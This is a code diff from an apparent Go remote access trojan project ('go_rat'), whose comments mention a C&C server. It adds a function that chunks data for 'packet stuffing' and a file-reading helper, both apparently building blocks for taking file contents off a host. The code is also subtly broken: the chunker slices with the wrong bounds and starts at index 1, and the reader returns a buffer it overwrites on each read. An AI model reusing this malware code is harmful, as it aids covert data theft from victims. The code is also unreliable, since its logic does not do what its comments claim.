@@ -6,12 +6,66 @@ from files, networks, software, etc...
 package Core
 
 import (
+	"bufio"
 	"encoding/json"
 	"go_rat/pkg/shared_code/ErrorHandling"
 	"io/ioutil"
 	"log"
 	"net/http"
+	"os"
 )
+
+// makes chunky data for packet stuffing
+// chunk size known, number of packets unknown
+func DataChunkerChunkSize(DataIn []byte, chunkSize int) [][]byte { //, derp error) {
+	//var chunkcount int = 1
+	var DataInLength = len(DataIn)
+	// make the buffer
+	DataOutBuffer := make([][]byte, DataInLength)
+	// loop over the original data object taking a bite outta crim... uh data
+	for asdf := 1; asdf < DataInLength; asdf += chunkSize { //chunkcount++{
+		// mark the end bounds
+		end := asdf + chunkSize
+		// necessary check to avoid slicing beyond
+		// slice capacity
+		if end > DataInLength {
+			end = DataInLength
+		}
+		DataOutBuffer = append(DataOutBuffer, DataIn[asdf:chunkSize])
+
+	}
+
+	return DataOutBuffer
+	//maybe return chunk_num int as well
+}
+
+func OpenFile(filename string) (filebytes []byte) {
+	// open the file
+	herp, derp := os.Open(filename)
+	if derp != nil {
+		ErrorPrinter(derp, "[-] Could not open File")
+	}
+	defer func() {
+		if derp = herp.Close(); derp != nil {
+			ErrorPrinter(derp, "generic error, fix me plz lol <3!")
+		}
+	}()
+	// make io.reader and the buffer it will read into
+	reader := bufio.NewReader(herp)
+	buffer := make([]byte, FILEREADSPEED)
+	for {
+		// read INTO buffer
+		// return bytes read as filebytes
+		_, derp := reader.Read(buffer)
+		if derp != nil {
+			ErrorPrinter(derp, "[-] Could not read from file")
+			break
+		}
+		Debug_print(4, "[+] Bytes read:") //, filebytes)
+
+	}
+	return buffer
+}
 
 // this function is to extract JSON data from HTTP Server on C&C
 
